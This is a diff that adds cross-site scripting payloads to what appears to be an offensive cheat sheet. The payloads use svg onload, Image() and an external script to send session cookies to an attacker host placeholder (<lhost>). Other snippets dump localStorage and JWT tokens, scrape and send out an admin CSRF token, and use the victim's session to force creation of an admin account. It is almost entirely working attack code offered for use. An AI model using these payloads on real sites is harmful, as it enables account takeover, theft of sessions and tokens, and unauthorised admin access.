@@ -166,8 +166,45 @@ GET callbacks store query params in `EXFIL_DATA[path]`. POST callbacks parse JSO
 // Generic img onerror
 <img src=x onerror="fetch('http://<lhost>/steal?b64_cookie='+btoa(document.cookie))">
 
+// svg onload
+<svg onload="fetch('http://<lhost>/steal?b64_cookie='+btoa(document.cookie))">
+
+// Image() object – compact, fits a pure-JS sink with no markup
+new Image().src='http://<lhost>/steal?b64_cookie='+btoa(document.cookie)
+
+// External script – keep the real payload off the injection point
+<script src="http://<lhost>/payload.js"></script>
+
 // Injected into an image src field
 data:image/jpeg;base64,<base64_jpeg_header>' onerror=fetch('http://<lhost>/steal?b64_cookie='+btoa(document.cookie))
+```
+
+If the session cookie is `HttpOnly`, cookie theft fails. Go after browser storage, scrape the CSRF token, or force the admin action directly instead.
+
+**Steal tokens from storage** (JWT / SPA sessions):
+```javascript
+// Dump everything in localStorage
+fetch('http://<lhost>/steal?ls='+btoa(JSON.stringify(localStorage)))
+
+// Grab a specific token
+new Image().src='http://<lhost>/steal?jwt='+localStorage.getItem('token')
+```
+
+**Scrape a CSRF token from an admin page** (then replay it server-side):
+```javascript
+fetch('/admin/settings').then(r => r.text()).then(t => {
+  const m = t.match(/csrf_token.*?value="(.*?)"/);
+  new Image().src = 'http://<lhost>/steal?csrf=' + m[1];
+});
+```
+
+**Force an admin action with the victim's session** (e.g. create an admin user):
+```javascript
+fetch('/admin/users', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ username: 'pwn', password: 'Pwn123!', role: 'admin' })
+});
 ```
 
 ---
